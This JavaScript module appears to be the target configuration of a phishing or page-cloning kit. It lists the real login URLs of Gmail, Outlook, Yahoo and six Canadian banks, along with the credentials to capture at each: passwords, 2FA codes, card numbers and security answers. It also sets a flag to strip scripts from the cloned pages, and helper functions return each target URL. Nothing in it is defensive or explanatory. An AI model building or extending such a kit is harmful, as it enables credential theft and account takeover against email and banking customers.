const spikeModules = {
    gmail: {
        description: "email | password | 2FA.",
        url: {
            desktop: "https://mail.google.com/",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    outlook: {
        description: "email | password | 2FA.",
        url: {
            desktop: "https://outlook.live.com/",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    yahoo: {
        description: "email | password | 2FA.",
        url: {
            desktop: "https://login.yahoo.com/",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    rbc: {
        description: "Client Card | Password | Security Questions.",
        url: {
            desktop: "https://www.rbcroyalbank.com/personal.html",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    td: {
        description: "Access Card | Password | Security Questions.",
        url: {
            desktop: "https://easyweb.td.com/",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    bmo: {
        description: "Client Card | Password | Security Questions.",
        url: {
            desktop: "https://www.bmo.com/main/personal",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    scotiabank: {
        description: "Username | Password | Security Questions.",
        url: {
            desktop: "https://www.scotiabank.com/ca/en/personal.html",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    cibc: {
        description: "Card Number | Password | Security Questions.",
        url: {
            desktop: "https://www.cibc.com/en/personal-banking.html",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    nationalbank: {
        description: "Username | Password | Security Questions.",
        url: {
            desktop: "https://www.nbc.ca/",
        },
        removeAllJs: true,
        // baseURI: "",
    }
};

const sortedKeys = Object.keys(spikeModules).sort();
const sortedObject = {};
sortedKeys.forEach(key => {
    sortedObject[key] = spikeModules[key];
});

module.exports = {
    spikeModules: sortedObject,
    checkSpikeModule(appName) {
        return spikeModules[appName];
    },
    getAppUrl(appName, device) {
        const url = spikeModules[appName]["url"][device];
        if (url == undefined) {
            return spikeModules[appName]["url"]["desktop"];
        }
        return url;
    }
};
